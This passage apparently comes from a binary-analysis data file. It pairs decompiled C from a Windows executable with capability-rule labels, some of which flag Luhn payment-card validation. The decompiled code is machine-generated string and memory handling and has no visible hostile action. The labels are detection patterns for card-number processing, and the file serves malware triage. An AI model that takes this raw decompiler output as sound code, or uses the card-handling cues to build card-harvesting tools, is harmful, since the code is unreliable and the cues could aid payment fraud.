*(iStack64 + -0x18);\n    iStack112 = 0x140088762;\n    iStack136 = fcn.1400bc6e0(iVar3 + 1);\n    iStack112 = 0x140088776;\n    iStack280 = iVar3;\n    fcn.140024ea0(puStack144, iStack136, iVar3, 0);\n    piStack120 = *0x14010fc90;\n    *(iStack136 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack136;\n    iVar2 = *piStack120;\n    *(arg3 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x140088970;\n        fcn.14007bf10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x1400887ba;\n    piStack272 = arg2;\n    (**(*arg2 + 0x28))(puStack144);\n    iVar3 = *(iStack64 + -0x18);\n    uStack128 = iVar3 + 1;\n    if (uStack128 < 0x3ffffffffffffffd) {\n        iStack112 = 0x1400887e5;\n        iVar6 = fcn.1400bc6e0(uStack128 * 2);\n        iStack112 = 0x1400887f9;\n        fcn.140023e10(puStack144, iVar6, iVar3, 0);\n        iVar2 = *piStack120;\n        *(arg3 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack128 * 2) = 0;\n        *(arg3 + 0x30) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack112 = 0x1400889e8;\n            fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n        }\n        iStack112 = 0x140088839;\n        (**(*arg2 + 0x30))(puStack144, arg2);\n        iVar3 = *(iStack64 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iVar3 + 1U) * 2;\n            iStack112 = 0x140088864;\n            iVar7 = fcn.1400bc6e0(iVar6);\n            iStack112 = 0x140088878;\n            fcn.140023e10(puStack144, iVar7, iVar3, 0);\n            iVar2 = *piStack120;\n            *(arg3 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x40) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack64 + -8);\n                *(iStack64 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack64 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack112 = 0x1400889c0;\n                fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n            }\n            iStack112 = 0x1400888b7;\n            (**(*arg2 + 0x38))(puStack144, arg2);\n            iVar3 = *(iStack64 + -0x18);\n            if (iVar3 + 1U < 0x3ffffffffffffffd) {\n                iVar6 = (iVar3 + 1U) * 2;\n                iStack112 = 0x1400888e2;\n                iVar7 = fcn.1400bc6e0(iVar6);\n                iStack112 = 0x1400888f6;\n                fcn.140023e10(puStack144, iVar7, iVar3, 0);\n                iVar2 = *piStack120;\n                *(arg3 + 0x48) = iVar7;\n                *(iVar7 + -2 + iVar6) = 0;\n                *(arg3 + 0x50) = iVar3;\n                if (iVar2 == 0) {\n                    iVar2 = *(iStack64 + -8);\n                    *(iStack64 + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack64 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    iStack112 = 0x140088994;\n                    fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n                }\n                iStack112 = 0x140088929;\n                uVar5 = (**(*arg2 + 0x48))(arg2);\n                *(arg3 + 0x5c) = uVar5;\n                iStack112 = 0x140088935;\n                uVar5 = (**(*arg2 + 0x50))(arg2);\n                *(arg3 + 0x60) = uVar5;\n                return;\n            }\n            iStack112 = 0x140088a35;\n            uVar8 = fcn.1400bd850();\n        }\n        else {\n            iStack112 = 0x1400889f2;\n            uVar8 = fcn.1400bd850();\n        }\n        do {\n            iStack112 = 0x140088a08;\n            fcn.140072a20(iStack64 + -0x18);\n            iStack112 = 0x140088a10;\n            uVar8 = fcn.140014f30(uVar8);\n        } while( true );\n    }\n    iStack112 = 0x140088a3c;\n    fcn.1400bd850();\n    puStack264 = &stack0xffffffffffffff40;\n    iStack232 = 0x140088a62;\n    iStack160 = arg3;\n    piStack152 = arg2;\n    iStack112 = iVar3;\n    uVar4 = (**(*piStack272 + 0x10))(piStack272);\n    *(iStack280 + 0x22) = uVar4;\n    iStack232 = 0x140088a6f;\n    uVar4 = (**(*piStack272 + 0x18))(piStack272);\n    *(iStack280 + 0x24) = uVar4;\n    iStack232 = 0x140088a7c;\n    uVar5 = (**(*piStack272 + 0x40))(piStack272);\n    *(iStack280 + 0x7a) = 1;\n    *(iStack280 + 0x58) = uVar5;\n    iVar3 = *piStack272;\n    *(iStack280 + 0x10) = 0;\n    *(iStack280 + 0x28) = 0;\n    *(iStack280 + 0x38) = 0;\n    *(iStack280 + 0x48) = 0;\n    iStack232 = 0x140088aaf;\n    (**(iVar3 + 0x20))(puStack264, piStack272);\n    iVar3 = iStack184;\n    iStack232 = 0x140088abe;\n    iStack256 = fcn.1400bc6e0(iStack184 + 1);\n    iStack232 = 0x140088ad2;\n    iVar6 = iVar3;\n    fcn.14002f850(puStack264, iStack256, iVar3, 0);\n    puStack240 = &stack0xffffffffffffff50;\n    *(iStack256 + iVar3) = 0;\n    *(iStack280 + 0x10) = iStack256;\n    *(iStack280 + 0x18) = iVar3;\n    if (puStack192 != puStack240) {\n        iStack232 = 0x140088af4;\n        fcn.1400bc6c0();\n    }\n    iStack232 = 0x140088b00;\n    piStack376 = piStack272;\n    (**(*piStack272 + 0x28))(puStack264);\n    iVar3 = iStack184;\n    uStack248 = iStack184 + 1;\n    if (uStack248 < 0x3ffffffffffffffd) {\n        iStack232 = 0x140088b27;\n        iVar6 = fcn.1400bc6e0(uStack248 * 2);\n        iStack232 = 0x140088b3b;\n        fcn.1400305e0(puStack264, iVar6, iVar3, 0);\n        *(iStack280 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack248 * 2) = 0;\n        *(iStack280 + 0x30) = iVar3;\n        if (puStack192 != puStack240) {\n            iStack232 = 0x140088b5a;\n            fcn.1400bc6c0();\n        }\n        iStack232 = 0x140088b66;\n        (**(*piStack272 + 0x30))(puStack264, piStack272);\n        iVar3 = iStack184;\n        if (iStack184 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack184 + 1U) * 2;\n            iStack232 = 0x140088b8d;\n            iVar7 = fcn.1400bc6e0(iVar6);\n            iStack232 = 0x140088ba1;\n            fcn.1400305e0(puStack264, iVar7, iVar3, 0);\n            *(iStack280 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(iStack280 + 0x40) = iVar3;\n            if (puStack192 != puStack240) {\n                iStack232 = 0x140088bc0;\n                fcn.1400bc6c0();\n            }\n            iStack232 = 0x140088bcc;\n            (**(*piStack272 + 0x38))(puStack264, piStack272);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack184 + 1U) * 2;\n                iStack232 = 0x140088bf3;\n                iVar6 = fcn.1400bc6e0(iVar3);\n                iStack232 = 0x140088c07;\n                fcn.1400305e0(puStack264, iVar6, iStack184, 0);\n                *(iStack280 + 0x48) = iVar6;\n                *(iVar6 + -2 + iVar3) = 0;\n                *(iStack280 + 0x50) = iStack184;\n                if (puStack192 != puStack240) {\n                    iStack232 = 0x140088c26;\n                    fcn.1400bc6c0();\n                }\n                iStack232 = 0x140088c2f;\n                uVar5 = (**(*piStack272 + 0x48))(piStack272);\n                *(iStack280 + 0x5c) = uVar5;\n                iStack232 = 0x140088c3b;\n                uVar5 = (**(*piStack272 + 0x50))(piStack272);\n                *(iStack280 + 0x60) = uVar5;\n                return;\n            }\n            iStack232 = 0x140088c80;\n            uVar8 = fcn.1400bd850();\n        }\n        else {\n            iStack232 = 0x140088c87;\n            uVar8 = fcn.1400bd850();\n        }\n        do {\n            if (puStack192 != puStack240) {\n                iStack232 = 0x140088c64;\n                fcn.1400bc6c0();\n            }\n            iStack232 = 0x140088c6c;\n            uVar8 = fcn.140014f30(uVar8);\n        } while( true );\n    }\n    iStack232 = 0x140088c8e;\n    fcn.1400bd850();\n    iStack232 = iStack184;\n    puStack368 = &stack0xfffffffffffffee0;\n    iStack336 = 0x140088cb2;\n    uVar4 = (**(*piStack376 + 0x10))(piStack376);\n    *(iVar6 + 0x22) = uVar4;\n    iStack336 = 0x140088cbf;\n    uVar4 = (**(*piStack376 + 0x18))(piStack376);\n    *(iVar6 + 0x24) = uVar4;\n    iStack336 = 0x140088ccc;\n    uVar5 = (**(*piStack376 + 0x40))(piStack376);\n    *(iVar6 + 0x7a) = 1;\n    *(iVar6 + 0x58) = uVar5;\n    iVar3 = *piStack376;\n    *(iVar6 + 0x10) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x38) = 0;\n    *(iVar6 + 0x48) = 0;\n    iStack336 = 0x140088cff;\n    (**(iVar3 + 0x20))(puStack368, piStack376);\n    iVar3 = *(iStack288 + -0x18);\n    iStack336 = 0x140088d12;\n    iStack360 = fcn.1400bc6e0(iVar3 + 1);\n    iStack336 = 0x140088d26;\n    iVar7 = iVar3;\n    fcn.140024ea0(puStack368, iStack360, iVar3, 0);\n    piStack344 = *0x14010fc90;\n    *(iStack360 + iVar3) = 0;\n    *(iVar6 + 0x10) = iStack360;\n    iVar2 = *piStack344;\n    *(iVar6 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack288 + -8);\n        *(iStack288 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack288 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack336 = 0x140088f20;\n        fcn.14007bf10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n    }\n    iStack336 = 0x140088d6a;\n    piVar10 = piStack376;\n    (**(*piStack376 + 0x28))(puStack368);\n    iVar3 = *(iStack288 + -0x18);\n    uStack352 = iVar3 + 1;\n    if (uStack352 < 0x3ffffffffffffffd) {\n        iStack336 = 0x140088d95;\n        iVar7 = fcn.1400bc6e0(uStack352 * 2);\n        iStack336 = 0x140088da9;\n        fcn.140023e10(puStack368, iVar7, iVar3, 0);\n        iVar2 = *piStack344;\n        *(iVar6 + 0x28) = iVar7;\n        *(iVar7 + -2 + uStack352 * 2) = 0;\n        *(iVar6 + 0x30) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack288 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack336 = 0x140088f98;\n            fcn.140072a10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        iStack336 = 0x140088de9;\n        (**(*piStack376 + 0x30))(puStack368, piStack376);\n        iVar3 = *(iStack288 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iVar3 + 1U) * 2;\n            iStack336 = 0x140088e14;\n            iVar9 = fcn.1400bc6e0(iVar7);\n            iStack336 = 0x140088e28;\n            fcn.140023e10(puStack368, iVar9, iVar3, 0);\n            iVar2 = *piStack344;\n            *(iVar6 + 0x38) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x40) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack288 + -8);\n                *(iStack288 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack288 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack336 = 0x140088f70;\n                fcn.140072a10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n            }\n            iStack336 = 0x140088e67;\n            (**(*piStack376 + 0x38))(puStack368, piStack376);\n            iVar3 = *(iStack288 + -0x18);\n            if (iVar3 + 1U < 0x3ffffffffffffffd) {\n                iVar7 = (iVar3 + 1U) * 2;\n                iStack336 = 0x140088e92;\n                iVar9 = fcn.1400bc6e0(iVar7);\n                iStack336 = 0x140088ea6;\n                fcn.140023e10(puStack368, iVar9, iVar3, 0);\n                iVar2 = *piStack344;\n                *(iVar6 + 0x48) = iVar9;\n                *(iVar9 + -2 + iVar7) = 0;\n                *(iVar6 + 0x50) = iVar3;\n                if (iVar2 == 0) {\n                    iVar2 = *(iStack288 + -8);\n                    *(iStack288 + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack288 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    iStack336 = 0x140088f44;\n                    fcn.140072a10(iStack288 + -0x18, &stack0xfffffffffffffedf);\n                }\n                iStack336 = 0x140088ed9;\n                uVar5 = (**(*piStack376 + 0x48))(piStack376);\n                *(iVar6 + 0x5c) = uVar5;\n                iStack336 = 0x140088ee5;\n                uVar5 = (**(*piStack376 + 0x50))(piStack376);\n                *(iVar6 + 0x60) = uVar5;\n                return;\n            }\n            iStack336 = 0x140088fe5;\n            uVar8 = fcn.1400bd850();\n        }\n        else {\n            iStack336 = 0x140088fa2;\n            uVar8 = fcn.1400bd850();\n        }\n        do {\n            iStack336 = 0x140088fb8;\n            fcn.140072a20(iStack288 + -0x18);\n            iStack336 = 0x140088fc0;\n            uVar8 = fcn.140014f30(uVar8);\n        } while( true );\n    }\n    iStack336 = 0x140088fec;\n    fcn.1400bd850();\n    iStack336 = iVar3;\n    uVar4 = (**(*piVar10 + 0x10))(piVar10);\n    *(iVar7 + 0x22) = uVar4;\n    uVar4 = (**(*piVar10 + 0x18))(piVar10);\n    *(iVar7 + 0x24) = uVar4;\n    uVar5 = (**(*piVar10 + 0x40))(piVar10);\n    *(iVar7 + 0x7a) = 1;\n    *(iVar7 + 0x58) = uVar5;\n    iVar3 = *piVar10;\n    *(iVar7 + 0x10) = 0;\n    *(iVar7 + 0x28) = 0;\n    *(iVar7 + 0x38) = 0;\n    *(iVar7 + 0x48) = 0;\n    (**(iVar3 + 0x20))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    iVar6 = fcn.1400bc6e0(iStack408 + 1);\n    fcn.14002f850(&stack0xfffffffffffffe60, iVar6, iVar3, 0);\n    *(iVar6 + iVar3) = 0;\n    *(iVar7 + 0x10) = iVar6;\n    *(iVar7 + 0x18) = iVar3;\n    if (puStack416 != &stack0xfffffffffffffe70) {\n        fcn.1400bc6c0();\n    }\n    arg1 = &stack0xfffffffffffffe60;\n    (**(*piVar10 + 0x28))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    if (0x3ffffffffffffffc < iStack408 + 1U) {\n        fcn.1400bd850();\n        *arg1 = 0x140117c30;\n        fcn.1400b7940(arg1 + 4);\n        *arg1 = 0x140117680;\n        fcn.1400838b0(arg1);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1);\n        return;\n    }\n    iVar6 = (iStack408 + 1U) * 2;\n    iVar9 = fcn.1400bc6e0(iVar6);\n    fcn.1400305e0(&stack0xfffffffffffffe60, iVar9, iVar3, 0);\n    *(iVar7 + 0x28) = iVar9;\n    *(iVar9 + -2 + iVar6) = 0;\n    *(iVar7 + 0x30) = iVar3;\n    if (puStack416 != &stack0xfffffffffffffe70) {\n        fcn.1400bc6c0();\n    }\n    (**(*piVar10 + 0x30))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    if (iStack408 + 1U < 0x3ffffffffffffffd) {\n        iVar6 = (iStack408 + 1U) * 2;\n        iVar9 = fcn.1400bc6e0(iVar6);\n        fcn.1400305e0(&stack0xfffffffffffffe60, iVar9, iVar3, 0);\n        *(iVar7 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar6) = 0;\n        *(iVar7 + 0x40) = iVar3;\n        if (puStack416 != &stack0xfffffffffffffe70) {\n            fcn.1400bc6c0();\n        }\n        (**(*piVar10 + 0x38))(&stack0xfffffffffffffe60, piVar10);\n        if (iStack408 + 1U < 0x3ffffffffffffffd) {\n            iVar3 = (iStack408 + 1U) * 2;\n            iVar6 = fcn.1400bc6e0(iVar3);\n            fcn.1400305e0(&stack0xfffffffffffffe60, iVar6, iStack408, 0);\n            *(iVar7 + 0x48) = iVar6;\n            *(iVar6 + -2 + iVar3) = 0;\n            *(iVar7 + 0x50) = iStack408;\n            if (puStack416 != &stack0xfffffffffffffe70) {\n                fcn.1400bc6c0();\n            }\n            uVar5 = (**(*piVar10 + 0x48))(piVar10);\n            *(iVar7 + 0x5c) = uVar5;\n            uVar5 = (**(*piVar10 + 0x50))(piVar10);\n            *(iVar7 + 0x60) = uVar5;\n            return;\n        }\n        uVar8 = fcn.1400bd850();\n    }\n    else {\n        uVar8 = fcn.1400bd850();\n    }\n    do {\n        if (puStack416 != &stack0xfffffffffffffe70) {\n            fcn.1400bc6c0();\n        }\n        uVar8 = fcn.140014f30(uVar8);\n    } while( true );\n}\n",
        "token_count": 6550
    },
    "140088c9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140088c90(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    int64_t iStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    uint64_t uStack128;\n    int32_t *piStack120;\n    int64_t iStack112;\n    uchar uStack65;\n    int64_t iStack64;\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140088cb2;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack112 = 0x140088cbf;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack112 = 0x140088ccc;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack112 = 0x140088cff;\n    (**(iVar3 + 0x20))(puStack144, arg2);\n    iVar3 = *(iStack64 + -0x18);\n    iStack112 = 0x140088d12;\n    iStack136 = fcn.1400bc6e0(iVar3 + 1);\n    iStack112 = 0x140088d26;\n    iVar6 = iVar3;\n    fcn.140024ea0(puStack144, iStack136, iVar3, 0);\n    piStack120 = *0x14010fc90;\n    *(iStack136 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack136;\n    iVar2 = *piStack120;\n    *(arg3 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x140088f20;\n        fcn.14007bf10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140088d6a;\n    piVar10 = arg2;\n    (**(*arg2 + 0x28))(puStack144);\n    iVar3 = *(iStack64 + -0x18);\n    uStack128 = iVar3 + 1;\n    if (0x3ffffffffffffffc < uStack128) {\n        iStack112 = 0x140088fec;\n        fcn.1400bd850();\n        iStack160 = arg3;\n        piStack152 = arg2;\n        iStack112 = iVar3;\n        uVar4 = (**(*piVar10 + 0x10))(piVar10);\n        *(iVar6 + 0x22) = uVar4;\n        uVar4 = (**(*piVar10 + 0x18))(piVar10);\n        *(iVar6 + 0x24) = uVar4;\n        uVar5 = (**(*piVar10 + 0x40))(piVar10);\n        *(iVar6 + 0x7a) = 1;\n        *(iVar6 + 0x58) = uVar5;\n        iVar3 = *piVar10;\n        *(iVar6 + 0x10) = 0;\n        *(iVar6 + 0x28) = 0;\n        *(iVar6 + 0x38) = 0;\n        *(iVar6 + 0x48) = 0;\n        (**(iVar3 + 0x20))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        iVar7 = fcn.1400bc6e0(iStack184 + 1);\n        fcn.14002f850(&stack0xffffffffffffff40, iVar7, iVar3, 0);\n        *(iVar7 + iVar3) = 0;\n        *(iVar6 + 0x10) = iVar7;\n        *(iVar6 + 0x18) = iVar3;\n        if (puStack192 != &stack0xffffffffffffff50) {\n            fcn.1400bc6c0();\n        }\n        arg1 = &stack0xffffffffffffff40;\n        (**(*piVar10 + 0x28))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        if (0x3ffffffffffffffc < iStack184 + 1U) {\n            fcn.1400bd850();\n            *arg1 = 0x140117c30;\n            fcn.1400b7940(arg1 + 4);\n            *arg1 = 0x140117680;\n            fcn.1400838b0(arg1);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1);\n            return;\n        }\n        iVar7 = (iStack184 + 1U) * 2;\n        iVar9 = fcn.1400bc6e0(iVar7);\n        fcn.1400305e0(&stack0xffffffffffffff40, iVar9, iVar3, 0);\n        *(iVar6 + 0x28) = iVar9;\n        *(iVar9 + -2 + iVar7) = 0;\n        *(iVar6 + 0x30) = iVar3;\n        if (puStack192 != &stack0xffffffffffffff50) {\n            fcn.1400bc6c0();\n        }\n        (**(*piVar10 + 0x30))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        if (iStack184 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iStack184 + 1U) * 2;\n            iVar9 = fcn.1400bc6e0(iVar7);\n            fcn.1400305e0(&stack0xffffffffffffff40, iVar9, iVar3, 0);\n            *(iVar6 + 0x38) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x40) = iVar3;\n            if (puStack192 != &stack0xffffffffffffff50) {\n                fcn.1400bc6c0();\n            }\n            (**(*piVar10 + 0x38))(&stack0xffffffffffffff40, piVar10);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack184 + 1U) * 2;\n                iVar7 = fcn.1400bc6e0(iVar3);\n                fcn.1400305e0(&stack0xffffffffffffff40, iVar7, iStack184, 0);\n                *(iVar6 + 0x48) = iVar7;\n                *(iVar7 + -2 + iVar3) = 0;\n                *(iVar6 + 0x50) = iStack184;\n                if (puStack192 != &stack0xffffffffffffff50) {\n                    fcn.1400bc6c0();\n                }\n                uVar5 = (**(*piVar10 + 0x48))(piVar10);\n                *(iVar6 + 0x5c) = uVar5;\n                uVar5 = (**(*piVar10 + 0x50))(piVar10);\n                *(iVar6 + 0x60) = uVar5;\n                return;\n            }\n            uVar8 = fcn.1400bd850();\n        }\n        else {\n            uVar8 = fcn.1400bd850();\n        }\n        do {\n            if (puStack192 != &stack0xffffffffffffff50) {\n                fcn.1400bc6c0();\n            }\n            uVar8 = fcn.140014f30(uVar8);\n        } while( true );\n    }\n    iStack112 = 0x140088d95;\n    iVar6 = fcn.1400bc6e0(uStack128 * 2);\n    iStack112 = 0x140088da9;\n    fcn.140023e10(puStack144, iVar6, iVar3, 0);\n    iVar2 = *piStack120;\n    *(arg3 + 0x28) = iVar6;\n    *(iVar6 + -2 + uStack128 * 2) = 0;\n    *(arg3 + 0x30) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x140088f98;\n        fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140088de9;\n    (**(*arg2 + 0x30))(puStack144, arg2);\n    iVar3 = *(iStack64 + -0x18);\n    if (iVar3 + 1U < 0x3ffffffffffffffd) {\n        iVar6 = (iVar3 + 1U) * 2;\n        iStack112 = 0x140088e14;\n        iVar7 = fcn.1400bc6e0(iVar6);\n        iStack112 = 0x140088e28;\n        fcn.140023e10(puStack144, iVar7, iVar3, 0);\n        iVar2 = *piStack120;\n        *(arg3 + 0x38) = iVar7;\n        *(iVar7 + -2 + iVar6) = 0;\n        *(arg3 + 0x40) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack112 = 0x140088f70;\n            fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n        }\n        iStack112 = 0x140088e67;\n        (**(*arg2 + 0x38))(puStack144, arg2);\n        iVar3 = *(iStack64 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iVar3 + 1U) * 2;\n            iStack112 = 0x140088e92;\n            iVar7 = fcn.1400bc6e0(iVar6);\n            iStack112 = 0x140088ea6;\n            fcn.140023e10(puStack144, iVar7, iVar3, 0);\n            iVar2 = *piStack120;\n            *(arg3 + 0x48) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x50) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack64 + -8);\n                *(iStack64 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack64 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack112 = 0x140088f44;\n                fcn.140072a10(iStack64 + -0x18, &stack0xffffffffffffffbf);\n            }\n            iStack112 = 0x140088ed9;\n            uVar5 = (**(*arg2 + 0x48))(arg2);\n            *(arg3 + 0x5c) = uVar5;\n            iStack112 = 0x140088ee5;\n            uVar5 = (**(*arg2 + 0x50))(arg2);\n            *(arg3 + 0x60) = uVar5;\n            return;\n        }\n        iStack112 = 0x140088fe5;\n        uVar8 = fcn.1400bd850();\n    }\n    else {\n        iStack112 = 0x140088fa2;\n        uVar8 = fcn.1400bd850();\n    }\n    do {\n        iStack112 = 0x140088fb8;\n        fcn.140072a20(iStack64 + -0x18);\n        iStack112 = 0x140088fc0;\n        uVar8 = fcn.140014f30(uVar8);\n    } while( true );\n}\n",
        "token_count": 3163
    },
    "1400a78c": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400a78c0(ulong *s2, ulong *arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    uchar auStack72 [16];\n    \n    if (s2 == arg2) {\n        return;\n    }\n    puVar7 = *s2;\n    puVar5 = s2 + 2;\n    puVar8 = *arg2;\n    puVar1 = arg2 + 2;\n    if (puVar5 == puVar7) {\n        iVar9 = s2[1];\n        if (puVar1 == puVar8) {\n            iVar4 = arg2[1];\n            if (iVar9 == 0) {\n                uVar6 = 0;\n                if (iVar4 != 0) {\n                    uVar6 = 0xffffffffffffffff;\n                    if (iVar4 + 1 != 0) {\n                        sub.msvcrt.dll_memcpy(puVar5, puVar8, iVar4 + 1);\n                        uVar6 = arg2[1];\n                        puVar8 = *arg2;\n                    }\n                    s2[1] = uVar6;\n                    arg2[1] = 0;\n                    *puVar8 = 0;\n                    return;\n                }\n            }\n            else {\n                iVar2 = iVar9 + 1;\n                if (iVar4 == 0) {\n                    if (iVar9 != -1) {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar7, iVar2);\n                        puVar7 = *s2;\n                        iVar9 = s2[1];\n                    }\n                    arg2[1] = iVar9;\n                    s2[1] = 0;\n                    *puVar7 = 0;\n                    return;\n                }\n                iVar4 = iVar4 + 1;\n                if (iVar4 == 0) {\n                    if (iVar2 == 0) {\n                        iVar4 = -1;\n                        uVar6 = 0xffffffffffffffff;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar5, iVar2);\n                        uVar6 = s2[1];\n                        iVar4 = arg2[1];\n                    }\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(auStack72, puVar1, iVar4);\n                    if (iVar2 != 0) {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar7, iVar2);\n                    }\n                    sub.msvcrt.dll_memcpy(puVar7, 